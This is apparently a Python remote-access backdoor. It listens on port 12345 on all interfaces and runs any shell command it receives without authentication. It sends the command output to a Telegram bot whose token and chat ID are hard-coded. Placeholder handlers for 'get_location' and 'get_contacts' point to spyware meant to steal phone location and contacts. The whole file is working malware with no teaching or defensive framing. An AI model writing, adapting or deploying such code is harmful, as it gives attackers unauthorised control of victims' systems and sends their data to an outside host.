import socket
import subprocess

def send_to_telegram(data):
    import requests
    telegram_api_url = 'https://api.telegram.org/bot7582895631:AAFpiW_jsxHNIW5TjLrni4uyVL1qowmCh6c/sendMessage'
    payload = {
        'chat_id': '7524343521',
        'text': data
    }
    requests.post(telegram_api_url, data=payload)

def execute_shell_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

def listen_for_commands():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 12345))  # Listening on port 12345
    server.listen(1)
    print("[*] Listening for connections on port 12345...")
    while True:
        client_socket, client_address = server.accept()
        print(f"[*] Connection received from {client_address}")
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            data = data.decode('utf-8')
            if data == "get_location":
                # Send location to Telegram
                send_to_telegram("Location data here")
            elif data == "get_contacts":
                # Send contacts to Telegram
                send_to_telegram("Contacts data here")
            elif data.startswith("run_shell"):
                # Execute a shell command
                command = data.split(' ', 1)[1]
                output = execute_shell_command(command)
                send_to_telegram(f"Command output: {output}")
            else:
                send_to_telegram("Unknown command received")
        client_socket.close()

if __name__ == "__main__":
    listen_for_commands()